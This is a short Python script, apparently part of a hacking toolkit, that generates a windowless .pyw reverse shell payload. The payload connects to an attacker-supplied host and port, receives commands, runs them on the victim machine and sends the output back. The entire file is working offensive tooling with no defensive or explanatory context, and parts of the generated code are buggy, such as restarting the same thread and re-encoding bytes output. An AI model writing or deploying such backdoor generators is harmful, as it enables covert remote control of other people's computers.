import sys
import os

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

payload = f"""
import socket
import threading
import sys
import time
from subprocess import run
LHOST = "{LHOST}"
LPORT = {LPORT}

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((LHOST,LPORT))




def getCommand():
    while True:
        try:
            command = client.recv(2048).decode('ascii')
            output = run(command, capture_output=True).stdout
            client.send(output.encode('ascii'))
        except:
            pass


def sendConnection():
    while True:       
        client.send('CONNECTED'.encode('ascii'))
        commandThread.start()
        time.sleep(250)       
commandThread = threading.Thread(target=getCommand)

sendSignalThread = threading.Thread(target=sendConnection)
sendSignalThread.start()
"""
write = open('Payloads/Generated/payload.pyw','w')
write.write(payload)
write.close()
